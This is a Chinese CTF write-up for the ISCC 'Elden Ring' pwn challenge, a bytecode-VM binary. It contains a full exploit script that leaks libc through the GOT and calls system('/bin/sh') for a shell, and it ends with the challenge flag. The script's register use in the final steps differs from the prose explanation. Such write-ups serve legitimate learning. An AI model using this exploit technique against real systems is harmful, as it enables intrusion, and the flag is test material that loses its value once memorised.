***\*PWN+\****[***\*Elden Ring\****](#Elden Ring)

***\*解题思路\****

保护全开的一个pwn题
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps1.jpg)

程序逻辑比较常规，放入deepseek也可以分析出大概，总之程序的大致逻辑就是先让用户输入一大段内容当做后续的指令来执行
本题相对简单不过多阐述逆向过程，主要在于使用gdb去调试，查看输入的值被移动到了什么地方，为了方便读者逆向下面提供我已经逆向出的结构体，导入IDA中即可使用

struct VMContext {
uint64_t regs[4];
uint64_t ip_offset;
uint64_t *rsp;
uint64_t *code_base;
uint64_t reserved;
uint64_t *rbp;
};

各函数的分析结果如下:

sub_12D5 → vm_fetch_opcode // 从指令流中读取1字节操作码
sub_132C → vm_read_imm_qword // 从指令流读取8字节立即数（用于MOV等指令的立即数操作）
sub_1393 → vm_stack_push // 压栈操作（带栈溢出检查）
sub_1432 → vm_stack_pop  // 出栈操作（带栈溢出检查）

各个分支的分析结果如下

|                                                              |
| ------------------------------------------------------------ |
| ***\*操作码\****                                             |
| 0x00                                                         |
| 0x01                                                         |
| 0x02                                                         |
| 0x03                                                         |
| 0x04                                                         |
| 0x05                                                         |
| 0x06                                                         |
| 0x07                                                         |
| 0x08                                                         |
| 0x09                                                         |
| 0x0A                                                         |
| 0x0B                                                         |
| 分析后的程序如下                                             |
| ![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps2.jpg) *Figure* 1*:* |
| ![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps3.jpg) *Figure* 2*:* |
| ![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps4.jpg) *Figure* 3*:* |
| ![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps5.jpg) *Figure* 4*:* |

***\*E\*******\*xp（如有，请粘贴完整代码，不允许截图！）\****

from xidp import * 
 
\#---------------------初始化---------------------------- 
arch = 64 
elf_os = 'linux' 
 
challenge = "./pwn2" 
libc_path = './libc.so.6' 
ip = '101.200.155.151:20000' 
\# 1-远程 其他-本地 
link = 2 
io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link) 
 
debug(0)       # 其他-debug  1-info 
\# context.terminal = ['tmux', 'splitw', '-h'] 
\#---------------------初始化----------------------------- 
 
\#---------------------debug------------------------------ 
\# 自定义cmd 
cmd = """ 
  set follow-fork-mode parent 
  x/60gx $rebase(0x4000) 
  heap 
  """ 
\# 断点 
bps = [0x014FF] 
\#---------------------debug------------------------------- 
 
def mov_imm(reg, imm): 
  """操作码 0x00: 将 8 字节立即数存入寄存器""" 
  """0x00, reg_idx, <8B立即数>""" 
  return flat(p8(0), p8(reg, signed=True), p64(imm, signed=True))  
 
def load_ptr_reg(ptr_reg_addr, target_reg): 
  """操作码 0x01: 寄存器间接加载 (src -> dst)""" 
  """0x01, target_reg = *ptr_reg_addr""" 
  return flat( 
      p8(1), 
      p8(ptr_reg_addr, signed=True),  # 允许为负数 
      p8(target_reg, signed=True) 
      ) 
 
def store_ptr_reg(reg, target_reg): 
  """操作码 0x02: 寄存器间接存储 (src -> [dst])""" 
  """0x02, *target_reg = reg""" 
  return flat(p8(2), p8(reg), p8(target_reg))  # <bb + b → p8+p8+p8 
 
def mov_reg1_reg2(reg1, reg2): 
  """操作码 0x03: 寄存器间移动 (src -> dst)""" 
  """0x03, reg2 = reg1""" 
  return flat(p8(3), p8(reg1), p8(reg2))  # <bb + b → p8+p8+p8 
 
def push(reg_idx): 
  """操作码 0x04: 压栈""" 
  """0x04, push reg; stack_rbp-0x8""" 
  return flat(p8(4), p8(reg_idx))  # <bB → p8+p8 
 
def pop(reg_idx): 
  """操作码 0x05: 出栈""" 
  """0x05, pop reg stack_rbp+0x8""" 
  return flat(p8(5), p8(reg_idx))  # <bB → p8+p8 
 
def call(reg_idx): 
  """操作码 0x06: 调用寄存器指向的函数""" 
  """call reg""" 
  return flat(p8(6), p8(reg_idx))  # <bB → p8+p8 
 
def jmp_reg(reg_idx): 
  """操作码 0x07: 跳转寄存器指向的地址""" 
  """0x07, jmp reg 但是对跳转的范围有限制，所以我们不使用他""" 
  return flat(p8(7), p8(reg_idx))  # <bB → p8+p8 
 
def vm_exit(): 
  """操作码 0x08: 虚拟机退出""" 
  return p8(8)  # b → p8 
 
def add(reg, imm): 
  """操作码 0x0A: 寄存器加立即数""" 
  return flat(p8(0xA), p8(reg), p64(imm))  # <bbQ → p8+p8+p64 
 
def sub(reg, imm): 
  """操作码 0x0B: 寄存器减立即数""" 
  return flat(p8(0xB), p8(reg), p64(imm))  # <bbQ → p8+p8+p64 
 
puts_offset = libc.sym['puts'] 
system_offset = puts_offset- libc.sym['system'] 
bin_sh_offset = next(libc.search(b'/bin/sh')) - puts_offset 
 
leak("puts_offset") 
leak("system_offset") 
leak("bin_sh_offset") 
 
\# VM_list = 0x04060 
 
pwndbg(1, bps, cmd) 
 
payload = load_ptr_reg(-11, 1) 
payload += sub(1, 0x78) 
payload += load_ptr_reg(1, 0) 
payload += load_ptr_reg(1, 2) 
payload += add(0, bin_sh_offset) 
payload += sub(4, system_offset) 
payload += call(4) 
 
put(payload) 
 
sda("Enter bytecode: ", payload) 
 
ia()

利用思路:

1. 既然我们有call的功能，那么我们只需要让 reg0 为 binsh地址 然后随便找个寄存器放入 system的地址 然后call一下就可以了
2. 那么我们就需要知道libc的基地址然后再libc中利用偏移找到binsh地址和system地址就可以了
3. 想要知道libc基地址其实我们也很容易想到就是去got表里面拿，那么我们想要知道got表的地址就需要知道程序基地址
4. 经过调试我们可以注意到 0x04008 off_4008 里面存放的指针是指向他自己的

![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps6.jpg)
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps7.jpg)
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps8.jpg)

5. 那么我们就可以利用这个地址获得got表地址，然后通过got表中的内容得到libc地址，再通过libc地址得到我们需要的binsh和system，最后call一下就拿到shell了

exp的利用过程如下

1. 执行 load_ptr_reg(-11, 1) 和 sub(1, 0x78)

先将这个地址放入到reg1寄存器中，然后通过加减把它变成指向puts的got表
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps9.jpg)
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps10.jpg)
![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps11.jpg)

2. 然后通过 load_ptr_reg(1, 0) load_ptr_reg(1, 2) 两条指令将 puts_addr 放入 reg0 和 reg2中
3. add(0, bin_sh_offset) sub(2, system_offset) 通过对于偏移量的加减分别计算出 binsh 和 system地址
4. 直接 call~~~~~~~~ 拿到shell

![img](file:///C:\Users\mqdhy\AppData\Local\Temp\ksohtml23192\wps12.jpg) 

ISCC{19fjm99l-ittw-a0dg-6ygx-mvt3t17mnnlb}

 